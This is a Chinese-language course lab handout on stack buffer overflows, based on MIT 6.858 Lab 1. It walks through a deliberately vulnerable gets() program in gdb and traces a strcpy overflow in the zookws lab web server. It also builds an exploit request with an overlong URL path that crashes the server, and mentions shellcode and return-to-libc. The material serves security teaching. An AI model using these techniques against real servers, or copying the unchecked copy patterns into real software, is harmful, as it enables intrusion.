#缓冲区溢出：原理与实验

###哈尔滨工业大学 网络与信息安全 张宇 2016

---

##背景知识

**预备知识**: Linux，x86体系结构，x86汇编，C语言，gdb

- [Memory Layout (Virtual Address Space of a C process)](memorylayout.pdf)
- [PC Assembly Language](supplyments/PC-Assembly-Language.pdf)
- [gcc x86 Assembly Quick Reference](gcc-x86-Assembly.pdf)
- [GDB Quick Reference](supplyments/gdb-refcard.pdf)

**缓冲区溢出（buffer overflow）**：在计算机安全和程序设计中的一种异常，当一个程序向缓冲区写入数据时，超出了缓冲区边界并且覆盖了相邻内存。

**调用栈（call stack）**：用于存储程序中运行子例程信息的栈数据结构，先入后出。

**栈缓冲区溢出（stack buffer overflow）**：程序向调用栈中原本缓冲区之外的内存地址写入数据，意图获取对指令指针的控制，将其指向恶意代码。

**Linux进程内存布局**

```
+——————————————+ 0xFFFFFFFF (high address)
| kernel space | 1GB/4GB
+——————————————+ 0xC0000000 == TASK_SIZE
|    stack     |
+——————————————+<——— stack pointer (%esp)
|      |       |
|      v       |
|      ^       |
|      |       |
+——————————————+
|memory mapping|<——— dynamically linked lib (*.so)
+——————————————+ 0x40000000
|      ^       |
|      |       |
+——————————————+<——— brk() point
|     heap     |<——— malloc(), free()
+——————————————+ 
|   bss seg    |<———uninitialized data (Block Started by Symbol)
+——————————————+ 
|  data seg    |<———initialized static data
+——————————————+ 
|  text seg    |<——- binary code (*.o), static lib (*.a)
+——————————————+ 0x08048000
|    unused    |
+——————————————+ 0x00000000 (low address)
```

字节序little-endian：低字节在前，32比特值B3B2B1B0

```
  +——+——+——+——+
  |B0|B1|B2|B3|
  +——+——+——+——+
low  —————>  high address
```

**栈帧（stack frame）**：函数调用数据结构单元

```
+———————————————————————-+    caller’s stack pointer (old %esp) 
|        arguments       |               |                   
+———————————————————————-+               |                  
|     return address     | (old %eip)    v                
+———————————————————————-+<——— callee’s sf (new %ebp)                              
|  caller’s sf pointer   |———> caller’s sf (old %ebp)
+———————————————————————-+
|    local variables     |
+————————————————————————+
|                        |<——— callee’s stack pointer (new %esp)
+———————————————————————-+
|           |            |
|           v            |
```

* caller调用者；callee被调用者，即子函数
* arguments：子函数参数，调用前入栈
* return address： 子函数调用前将待执行下一条指令地址保存在返回地址中，待函数调用结束后，返回到调用者继续执行
* `eip` 指令指针指向下一条指令地址
* stack frame pointer 栈帧指针指向调用者的栈帧基址`ebp`
* `ebp` 基址指针指向栈帧底（高地址）
* `esp` 栈指针指向栈顶（低地址）

* caller调用者规则：

	1. 子函数参数入栈，从右向左
	1. `call`指令，将返回地址入栈后执行函数
	1. 子函数返回，返回值在`eax`中，清除栈中参数，恢复寄存器值

* callee被调用者规则：

	1. 保存caller的栈基址，设定callee新的栈基址为当前栈指针（`ebp`入栈，拷贝`esp`到`ebp`中）
	1. 为局部变量分配栈空间
	1. 执行函数，结果保存在`eax`中，恢复寄存器，清除局部变量，执行`ret`指令

---
##栈缓冲区溢出

研究一个存在缓冲区溢出漏洞的程序`readreq.c`，该程序读入用户输入的数字后，打印输出。

``` c
#include <stdio.h>

int read_req(void) {
    char buf[128];
    int i;
    gets(buf);
    i = atoi(buf);
    return i;
}

int main(int ac, char **av) {
  int x = read_req();
  printf("x=%d\n", x);
}
```

编译命令：

``` sh
$ cat Makefile
objects = readreq
cc = gcc -m32 -static -g -Wno-deprecated-declarations -fno-stack-protector
$(objects) : $(objects).c
	$(cc) $(objects).c -o $(objects)
clean :
	rm $(objects)
```

* `-m32` 编译为32位程序
* `-static` 静态链接
* `-g` 加入调试信息
* `-Wno-deprecated-declarations` 不对deprecated（废弃）内容发出警告，`gets()`已经被废弃
* `-fno-stack-protector` 不注入用于防止缓冲区溢出的代码

编译并运行程序，查看不同输入下的输出。

``` sh
$ make
gcc -m32 -static -g -Wno-deprecated-declarations -fno-stack-protector readreq.c -o readreq
/tmp/ccXK2Fse.o: In function `read_req':
/home/httpd/lecture1/readreq.c:6: warning: the `gets' function is dangerous and should not be used.
$ ./readreq
123
x=123
$ ./readreq
AAAAAAA
x=0
$ ./readreq [缓冲区溢出示例]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

下面用gdb调试程序，通过反汇编技术研究缓冲区溢出细节。

```  gas
$ gdb ./readreq
(gdb) b read_req [在read_req函数设置断点]
Breakpoint 1 at 0x8048e4d: file readreq.c, line 6.
(gdb) r [运行]
Starting program: /home/httpd/lecture1/readreq

Breakpoint 1, read_req () at readreq.c:6
6	    gets(buf);
(gdb) info registers [查看寄存器信息，[十六进制，十进制/翻译，说明]]
eax            0x1	1  [累加器]
ecx            0x52987f86	1385725830  [计数器]
edx            0xbffff704	-1073744124  [数据]
ebx            0x80481a8	     134513064  [基址，ebp]
esp            0xbffff610	0xbffff610  [栈指针]
ebp            0xbffff6b8	0xbffff6b8  [基址指针]
esi            0x0	0  [源索引]
edi            0x80eb00c	135180300  [目标索引]
eip            0x8048e4d	0x8048e4d <read_req+9>  [指令指针]
eflags         0x28 [ SF IF ] [标志寄存器，符号标记，中断允许标记]
cs             0x73	115  [代码段]
ss             0x7b	123  [堆栈段]
ds             0x7b	123  [数据段]
es             0x7b	123  [附加段]
fs             0x0	0    [无明确定义，字母表中f在e之后]
gs             0x33	51   [无明确定义, g在f之后]
```
反汇编：

```gas
(gdb) disass read_req   [反汇编，AT&T风格]
Dump of assembler code for function read_req:
   0x08048e44 <+0>:	push   %ebp   [将旧%ebp入栈*]
   0x08048e45 <+1>:	mov    %esp,%ebp [用%esp来设定新%ebp]
   0x08048e47 <+3>:	sub    $0xa8,%esp [栈增长，留出局部变量空间*]
=> 0x08048e4d <+9>:	lea    -0x8c(%ebp),%eax [将&buf[0]地址…*]
   0x08048e53 <+15>: mov    %eax,(%esp) [移入栈顶，向gets传递参数]
   0x08048e56 <+18>: call   0x804fc90 <gets> [将%eip入栈并调用]
   0x08048e5b <+23>: lea    -0x8c(%ebp),%eax [将&buf[0]地址]
   0x08048e61 <+29>: mov    %eax,(%esp)   [移入栈顶，传递参数]
   0x08048e64 <+32>: call   0x804dd10 <atoi>
   0x08048e69 <+37>: mov    %eax,-0xc(%ebp) [将atoi结果写入i]
   0x08048e6c <+40>: mov    -0xc(%ebp),%eax [将i写入函数返回值]
   0x08048e6f <+43>: leave [弹出整个栈帧*]
   0x08048e70 <+44>: ret [弹出栈中%eip，并跳转执行]
End of assembler dump.
```

* `push`指令将操作数压入栈中。在压栈前，将`esp`值减4（X86栈增长方向与内存地址编号增长方向相反），然后将操作数压入`esp`指示位置。
* `pop`指令与`push`指令相反。先将`esp`指示地址中内容出栈，然后将`esp`值加4。
* 栈增长（168 bytes）要超过局部变量大小之和（4+128 bytes），并按16 bytes对齐
* `lea`: load effective address, 拷贝地址(而不是内容)
* `leave`相当于`mov %ebp,%esp`, `pop %ebp`，此时`esp`指向返回地址
* `ret`执行`pop %eip`，将返回地址写入`eip`

查看一下寄存器和栈帧中的内容，以此绘制栈帧结构图。

``` gas
(gdb) p $ebp
$1 = (void *) 0xbffff6b8
(gdb) p $esp
$2 = (void *) 0xbffff610
(gdb) p &i
$3 = (int *) 0xbffff6ac
(gdb) p &buf
$4 = (char (*)[128]) 0xbffff62c
(gdb) x $ebp+4
0xbffff6bc:	0x08048e7f
```

`read_req()`栈帧示例：

```
+———————————————————————-+   
|        arguments       |                                  
+———————————————————————-+                                 
|     return address     |<——— +4 =0xbffff6bc %eip=0x08048e7f
+———————————————————————-+                             
|       main() ebp       |<——— %ebp        =0xbffff6b8
+———————————————————————-+
|                        |
+————————————————————————+
|       int  i           |<——— -0x0c (-12) =0xbffff6ac
+————————————————————————+
|buf[127]   ^            |
|           |            |
|           |      buf[0]|<——— -0x8c(-140)=0xbffff62c
+————————————————————————+ 
|                        |
+———————————————————————-+
|   &buf for gets()      |<——— -0xa8(-168)=0xbffff610 new %esp
+———————————————————————-+
```

继续运行程序，进行缓冲区溢出。

``` gas
(gdb) n [运行gets()]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
7	    i = atoi(buf);
```

此时发生了什么？大量的A（0x41）从`buf[0]`开始写入到栈中，从下向上覆盖之前栈中内容。下面查看栈中内容。

```  gas
(gdb) p &buf[0]
$5 = 0xbffff62c 'A' <repeats 200 times>… [超过了缓冲区大小128字节]
(gdb) x $ebp [检查$ebp所指向地址内容，已经被AAAA覆盖]
0xbffff6b8:	0x41414141  
(gdb) x $ebp+4 [检查返回地址，已经被AAAA覆盖]
0xbffff6bc:	0x41414141
(gdb) n [运行atoi()]
8	    return i;
(gdb) disass
Dump of assembler code for function read_req:
   0x08048e44 <+0>:	push   %ebp
   0x08048e45 <+1>:	mov    %esp,%ebp
   0x08048e47 <+3>:	sub    $0xa8,%esp
   0x08048e4d <+9>:	lea    -0x8c(%ebp),%eax
   0x08048e53 <+15>:	mov    %eax,(%esp)
   0x08048e56 <+18>:	call   0x804fc90 <gets>
   0x08048e5b <+23>:	lea    -0x8c(%ebp),%eax
   0x08048e61 <+29>:	mov    %eax,(%esp)
   0x08048e64 <+32>:	call   0x804dd10 <atoi>
   0x08048e69 <+37>:	mov    %eax,-0xc(%ebp)
=> 0x08048e6c <+40>:	mov    -0xc(%ebp),%eax
   0x08048e6f <+43>:	leave
   0x08048e70 <+44>:	ret
End of assembler dump.
(gdb) p &buf[0]   [查看buf]
$8 = 0xbffff62c 'A' <repeats 128 times> 
```

为什么变为128? `atoi()`执行后，变量`i=0`，而`i`正好在`buf`结尾之后，相当于在字符串后插入`\0`。

接着执行两个指令到`ret`。由于返回地址被改写，导致`ret`后跳转到错误地址，进而程序崩溃。

``` gas
(gdb) nexti
9	}
(gdb) nexti
0x08048e70	9	}
(gdb) disass
Dump of assembler code for function read_req:
   0x08048e44 <+0>:	push   %ebp
   0x08048e45 <+1>:	mov    %esp,%ebp
   0x08048e47 <+3>:	sub    $0xa8,%esp
   0x08048e4d <+9>:	lea    -0x8c(%ebp),%eax
   0x08048e53 <+15>:	mov    %eax,(%esp)
   0x08048e56 <+18>:	call   0x804fc90 <gets>
   0x08048e5b <+23>:	lea    -0x8c(%ebp),%eax
   0x08048e61 <+29>:	mov    %eax,(%esp)
   0x08048e64 <+32>:	call   0x804dd10 <atoi>
   0x08048e69 <+37>:	mov    %eax,-0xc(%ebp)
   0x08048e6c <+40>:	mov    -0xc(%ebp),%eax
   0x08048e6f <+43>:	leave
=> 0x08048e70 <+44>:	ret
End of assembler dump.

(gdb) p $eip   [下一条指令是ret]
$11 = (void (*)()) 0x8048e70 <read_req+44>
(gdb) nexti     [ret后，下一条指令地址是AAAA]
0x41414141 in ?? ()
(gdb) p $eip
$12 = (void (*)()) 0x41414141
(gdb) nexti

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

运行另一个演示，模拟通过缓冲区溢出可以改写返回地址，操纵跳转到指定地址。

``` gas
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/httpd/lecture1/readreq

Breakpoint 1, read_req () at readreq.c:6
6	    gets(buf);
(gdb) n
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
7	    i = atoi(buf);
(gdb) n
8	    return i;
(gdb) disas
Dump of assembler code for function read_req:
   0x08048e44 <+0>:	push   %ebp
   0x08048e45 <+1>:	mov    %esp,%ebp
   0x08048e47 <+3>:	sub    $0xa8,%esp
   0x08048e4d <+9>:	lea    -0x8c(%ebp),%eax
   0x08048e53 <+15>:	mov    %eax,(%esp)
   0x08048e56 <+18>:	call   0x804fc90 <gets>
   0x08048e5b <+23>:	lea    -0x8c(%ebp),%eax
   0x08048e61 <+29>:	mov    %eax,(%esp)
   0x08048e64 <+32>:	call   0x804dd10 <atoi>
   0x08048e69 <+37>:	mov    %eax,-0xc(%ebp)
=> 0x08048e6c <+40>:	mov    -0xc(%ebp),%eax
   0x08048e6f <+43>:	leave
   0x08048e70 <+44>:	ret
End of assembler dump.
(gdb) ni  [执行两个指令到ret处]
9	}
(gdb) ni
0x08048e70	9	}
```

回顾之前关于`leave`和`ret`的内容：
`leave`相当于`mov %ebp,%esp`, `pop %ebp`，此时`esp`指向返回地址。之后，`ret`执行`pop %eip`，将返回地址写入`eip`。

这里，我们模拟缓冲区溢出时，攻击者精心构造一个输入，在返回地址处写入了预定的指令地址：`main`函数中`printf`之前载入参数的指令。

``` gas
(gdb) x $esp [$esp指向栈中返回地址被覆盖]
0xbffff6bc:	0x41414141
(gdb) disas main
Dump of assembler code for function main:
   0x08048e71 <+0>:	push   %ebp
   0x08048e72 <+1>:	mov    %esp,%ebp
   0x08048e74 <+3>:	and    $0xfffffff0,%esp
   0x08048e77 <+6>:	sub    $0x20,%esp
   0x08048e7a <+9>:	call   0x8048e44 <read_req>
   0x08048e7f <+14>:	mov    %eax,0x1c(%esp)
   0x08048e83 <+18>:	mov    0x1c(%esp),%eax
   0x08048e87 <+22>:	mov    %eax,0x4(%esp)
   0x08048e8b <+26>:	movl   $0x80bf0c8,(%esp)
   0x08048e92 <+33>:	call   0x804f730 <printf>
   0x08048e97 <+38>:	leave
   0x08048e98 <+39>:	ret
End of assembler dump.
(gdb) set {int}$esp=0x08048e8b [直接改写$esp指向栈中返回地址]
(gdb) x $esp
0xbffff6bc:	0x08048e8b
(gdb) c
Continuing.
x=1094795585 [程序在返回main之后没有崩溃，printf打印了x]

Program received signal SIGSEGV, Segmentation fault.
main (ac=<error reading variable: Cannot access memory at address 0x41414149>,
    av=<error reading variable: Cannot access memory at address 0x4141414d>)
    at readreq.c:14
14	}
```

但程序最后还是崩溃了，为什么？因为`main`的调用者返回地址也被改写了，`main`返回后就崩溃了。上面输出显示`main`参数都被改写了。

**问1**：如果栈生长方向相反，即从低地址向高地址生长，对于本程序还会发生问题吗？

```
|                        |    |                        |
|                        |    |    return address      | 
|                        |    |  arguments for gets()  |                                                                 
+————————————————————————+    +————————————————————————+
|buf[127]   ^            |  
|           |            |   
|           |      buf[0]|   
+————————————————————————+
|        int  i          |
+————————————————————————+ 
|        main ebp        |
+————————————————————————+ 
|     return address     |
+———————————————————————-+
|        arguments       |
+———————————————————————-+
```

**答1**：依旧会发生问题，`buf`会覆盖`gets()`，调用后的返回地址，令攻击更容易！

**问2**：我们令返回地址指向了已经存在的指令，如何利用缓冲区溢出执行任意代码？

**答2**：将攻击代码嵌入到输入的`buf`中，令返回地址指向`buf`中嵌入的代码。通常攻击者想要启动一个shell，这种攻击代码叫做shellcode! 若栈中内容不允许执行，则需要另返回地址指向其他存在的功能丰富的代码，例如指向libc中特定函数。

本节课中熟悉实验环境，分析一个Web服务器的逻辑，寻找缓冲区溢出漏洞并触发该漏洞。

## 实验预备

实验资料见[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

实验环境为Ubuntu，在VMware Player (VMware Fusion)虚拟机中运行。系统中有两个账号：

- `root`，口令6858，用来安装软件
- `httpd`，口令6858，运行Web服务器和实验程序

本课程实验研究一个web服务器`zookws`。该服务器上运行一个Python的web应用`zoobar`，用户之间转移一种称为“zoobars”的货币。



1. 在VMware里用`httpd`账号登录后，运行`ifconfig`查看IP地址
1. 用终端软件通过SSH登录系统`ssh httpd@IP地址`
1. 运行`scp lab1.zip httpd@IP地址`将实验程序拷贝到`/home/httpd`
2. 安装`unzip`程序，解压缩文件，并移动到`/home/httpd/lab`
3. `make`编译程序
4. 启动服务器`./clean-env.sh ./zookld zook-exstack.conf`
5. 用浏览器访问zook服务`http://虚拟机IP地址:8080/`

服务器端包含以下主要文件：

- `clean-env.sh`脚本令程序每次运行时栈和内存布局都相同
- `zookld.c`: 启动`zook.conf`中所配置服务，如`zookd`和`zookfs`
- `zookd.c`: 将HTTP请求路由到相应服务，如`zookfs`
- `zookfs.c`: 提供静态文件或执行动态代码服务
- `http.c`: HTTP实现
- `index.html`: Web服务器首页
- `/zoobar`目录：zoobar服务实现



```
              |     +—————————+   
              |     |zookld.c |<—— "zook-*.conf" 
              |     +———+—————+                 
              |         |——————————————+
              |         |              |         +—————————————+
+——————+    HTTP    +———v———+      +———v————+    |CGI, Database|
|client| <====|===> |zookd.c|<————>|zookfs.c|———>|"/zoobar"    |
+——————+      |     +———^———+      +———^————+    +—————————————+ 
              |         |              | (2) http_request_headers()
(1) http_request_line() |   +——————+   | (3) http_serve()
              |         +———|http.c|———+
              |             +——————+
```


服务器端采用CGI (Common Gateway Interface)技术，将客户端请求URL映射到脚本或者普通HTML文件。CGI脚本可以由任意程序语言实现，脚本只需将HTTP头部和HTML文档输出到标准输出。本例CGI由`/zoobar`目录中的python脚本实现，其中也包含一个数据库。目前，我们不需要关心具体zoobar服务内容。

`zookd`和`zookfs`执行程序分别有两个版本：

- `*-exstack`版本有可执行的栈，将攻击代码注入到栈中缓冲区
- `*-nxstack`版本的栈不可执行，需要用其他技术来运行攻击代码

查看一下被启动的程序：

``` sh
$ ps -fp $(pgrep zook)
UID        PID  PPID  C STIME TTY      STAT   TIME CMD
httpd     4448  2493  0 15:44 pts/3    S+     0:00 /home/httpd/lab/zookld zook-exstack.conf
httpd     4453  4448  0 15:44 pts/3    S+     0:00 zookd-exstack 5
httpd     4454  4448  0 15:44 pts/3    S+     0:00 zookfs-exstack 6
```

服务器采用这一架构的原因会在之后的课程中学习。

---

##HTTP简介

参考资料：[How the web works: HTTP and CGI explained](supplyments/How-the-web-works.pdf)

HTTP请求格式：

```
[METH] [REQUEST-URI] HTTP/[VER]
Field1: Value1
Field2: Value2

[request body, if any]
```
HTTP请求例子：

```
GET / HTTP/1.0
User-Agent: Mozilla/3.0 (compatible; Opera/3.0; Windows 95/NT4)
Accept: */*
Host: birk105.studby.uio.no:81
```

HTTP应答格式：

```
HTTP/[VER] [CODE] [TEXT]
Field1: Value1
Field2: Value2

...Document content here...
```
HTTP应答例子：

```
HTTP/1.0 200 OK
Server: Netscape-Communications/1.1
Date: Tuesday, 25-Nov-97 01:22:04 GMT
Last-modified: Thursday, 20-Nov-97 10:44:53 GMT
Content-length: 6372
Content-type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
...followed by document content...
```

---

### 寻找漏洞

缓冲区溢出存在的要素：数组（字符串），串处理/读取函数（写操作）。

数组：`char * s`, `char s[128]`, `int a[128]`, `void * p`。

函数： `strcpy()`, `strcat()`, `sprintf()`, `vsprintf()`, `gets()`, `getc()`, `read()`, `scanf()`, `getenv()`。

除了调用函数外，还可能通过`for/while {}`循环的方式来访问缓冲区。

在源码中搜索一个‘危险’函数`strcpy()`。

``` c
$ grep -n 'strcpy' *.c
http.c:344:    strcpy(dst, dirname);
```
在`http.c`中找到了一处潜在漏洞，来具体看一下代码。

``` c
void dir_join(char *dst, const char *dirname, const char *filename) {
    strcpy(dst, dirname);
    if (dst[strlen(dst) - 1] != '/')
        strcat(dst, "/");
    strcat(dst, filename);
}
```

`dir_join()`函数将`dirname`和`filename`先后拷贝到`dst`中。显然，这里并没有检查每一个字符串长度。若`dirname`长度比`dst`缓冲长，则`strcpy()`调用存在缓冲区溢出风险。

进一步检查使用`dir_join()`时是否存在导致缓冲区溢出的可能：

``` c
void http_serve_directory(int fd, const char *pn) {
    /* for directories, use index.html or similar in that directory */
    static const char * const indices[] = {"index.html", "index.php", "index.cgi", NULL};
    char name[1024];
    struct stat st;
    int i;

    for (i = 0; indices[i]; i++) {
        dir_join(name, pn, indices[i]);
        if (stat(name, &st) == 0 && S_ISREG(st.st_mode)) {
            dir_join(name, getenv("SCRIPT_NAME"), indices[i]);
            break;
        }
    }

    if (indices[i] == NULL) {
        http_err(fd, 403, "No index file in %s", pn);
        return;
    }

    http_serve(fd, name);
}
```
在`dir_join(name, pn, indices[i]);`调用中，`char name[]`长度为1024。`char * pn`长度待定，继续查看`http_serve_directory()`调用情况。

``` c
void http_serve(int fd, const char *name)
{
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name);
    split_path(pn);

    if (!stat(pn, &st))
    {
        /* executable bits -- run as CGI script */
        if (valid_cgi_script(&st))
            handler = http_serve_executable;
        else if (S_ISDIR(st.st_mode))
            handler = http_serve_directory;
        else
            handler = http_serve_file;
    }

    handler(fd, pn);
}
```
`handler = http_serve_directory`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。

``` c
zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
```
该环境变量在`http.c`中`http_request_line()`函数中被设置。

``` c
http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
```

在`zookd.c`中，`http_request_line()`函数被`process_client()`函数调用。

```
zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
```

我们把这一漏洞命名为“LONG_URI”漏洞，回顾分析过程如下：

``` c
http.c:344:    strcpy(dst, dirname) // dst size = ?
|                                  //  |
dir_join(name, pn, indices[i]);   // name size = 1024
|                                //  |
handler(fd, pn);                // pn size = 1024
|
zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
|      
http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
|
zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
```
---
## 触发漏洞

首先，该漏洞必须能改写栈中的一个返回地址；其次，改写一些数据结构来用于夺取程序的控制流。撰写触发该漏洞的程序，并验证改程序可以导致web服务器崩溃（通过`dmesg | tail`, 使用`gdb`, 或直接观察）。

漏洞利用程序模板为`exploit-template.py`，该程序向服务器发送特殊请求。

首先启动服务：`./clean-env.sh ./zookld zook-exstack.conf`。
下面是是未改写的`exploit-template.py`执行结果。

``` html
$ ./exploit-template.py 127.0.0.1 8080
HTTP request:
GET / HTTP/1.0       <-- 客户端请求：方法，URL，HTTP版本号

Connecting to 127.0.0.1:8080...
Connected, sending request...
Request sent, waiting for reply...
Received reply.
HTTP response:
HTTP/1.0 200 OK      <-- HTTP版本号，状态代码
<html>               <-- 文档
<head>
  <meta http-equiv="refresh" content="0; URL=zoobar/index.cgi/" />
</head>
<body>
  <a href="zoobar/index.cgi/">Click here</a>
</body>
</html>
```
我们发现了可由我们控制的用户输入，客户端请求位于下面代码中： 

``` python
## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req =   "GET / HTTP/1.0\r\n" + \
            "\r\n"
    return req
```

目前，我们手上有了两个攻击服务器的武器：(1) “LONG_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。

通过分析代码可以发现，HTTP请求中的路径，例如`/foo.html`，被赋予了`REQUEST_URI`变量，因此可以通过构造较长的HTTP请求路径来令缓冲区溢出。
下面的代码有删节。

``` c
const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
{
    static char buf[8192];      /* static variables are not on the stack */
    char *sp1, *sp2, *qp, *envp = env;
    //  ... ... 
    if (http_read_line(fd, buf, sizeof(buf)) < 0)
        return "Socket IO error";

    /* Parse request like "GET /foo.html HTTP/1.0" */
    sp1 = strchr(buf, ' ');
    if (!sp1)
        return "Cannot parse HTTP request (1)";
    *sp1 = '\0';
    sp1++;
    if (*sp1 != '/')
        return "Bad request path";
    sp2 = strchr(sp1, ' ');
    if (!sp2)
        return "Cannot parse HTTP request (2)";
    *sp2 = '\0';
    sp2++;
    //  ... ...
    /* decode URL escape sequences in the requested path into reqpath */
    url_decode(reqpath, sp1);
    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
    //  ... ...
}
```

之前发现缓冲区有1024字节，我们就令请求路径超过1024字节。

``` python
 req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
            "\r\n"
```
将攻击脚本复制两份，命名为`exploit-2a.py`和`exploit-2b.py`，并用`make check-crash`来验证是否导致程序崩溃。

``` sh
$ make check-crash
./check-bin.sh
./check-part2.sh zook-exstack.conf ./exploit-2a.py
./check-part2.sh: line 8:  4398 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4417  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4417  +++ killed by SIGSEGV +++
PASS ./exploit-2a.py
./check-part2.sh zook-exstack.conf ./exploit-2b.py
./check-part2.sh: line 8:  4423 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4442  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4442  +++ killed by SIGSEGV +++
PASS ./exploit-2b.py
```

该程序并通过(PASS)了检查。缓冲区漏洞导致程序因为SIGSEV信号而崩溃，指令地址被改写为`si_addr=0x41414141`。下面看看具体发生了什么。

使用`gdb -p 进程号`来调试程序。进程号可通过两种方法获得：观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。

使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的子进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。

当生成子进程时，`gdb`缺省情况下仍然调试父进程，而不会跟踪子进程。由于`zookfs`为每个服务请求生成一个子进程，为了自动跟踪子进程，使用`set follow-fork-mode child`命令。该命令已经被加入`/home/httpd/lab/.gdbinit`中，`gdb`启动时会自动执行。

调试流程如下：

1. 在终端1中，重启服务：
`$ ./clean-env.sh ./zookld zook-exstack.conf`。
1. 在终端2中，启动`gdb`（`gdb -p PID`），并设置断点（`b`命令）。
1. 在终端3中，运行漏洞触发程序 `./exploit-2a.py localhost 8080`。
1. 返回终端2，继续调试（`c`命令）。

首先，调试`zookd`。`http_request_line`负责处理HTTP请求。

``` gas
$ gdb -p $(pgrep zookd-exstack)
...
(gdb) b http_request_line
Breakpoint 1 at 0x8049150: file http.c, line 67.
[运行漏洞触发程序]
(gdb) c
Continuing.

Breakpoint 1, http_request_line (fd=5, reqpath=0xbfffee08 "", env=0x804e520 <env> "", env_len=0x8050520 <env_len>) at http.c:67
warning: Source file is more recent than executable.
67          char *sp1, *sp2, *qp, *envp = env; 
(gdb) n
[执行n多次直到REQUEST_URI被处理完]
(gdb) n
109         envp += sprintf(envp, "SERVER_NAME=zoobar.org") + 1;
(gdb) x/10 buf        [打印buf，请求中各字段已经被分割]
0x8050540 <buf.4435>:   "GET"
0x8050544 <buf.4435+4>: "/", 'A' <repeats 199 times>...
0x805060c <buf.4435+204>:       'A' <repeats 200 times>...
0x80506d4 <buf.4435+404>:       'A' <repeats 200 times>...
0x805079c <buf.4435+604>:       'A' <repeats 200 times>...
0x8050864 <buf.4435+804>:       'A' <repeats 200 times>...
0x805092c <buf.4435+1004>:      'A' <repeats 25 times>
0x8050946 <buf.4435+1030>:      "HTTP/1.0"
0x805094f <buf.4435+1039>:      ""
0x8050950 <buf.4435+1040>:      ""
(gdb) x/10 reqpath    [打印reqpath，为"/", A * 1024]
0xbfffee08:     "/", 'A' <repeats 199 times>...
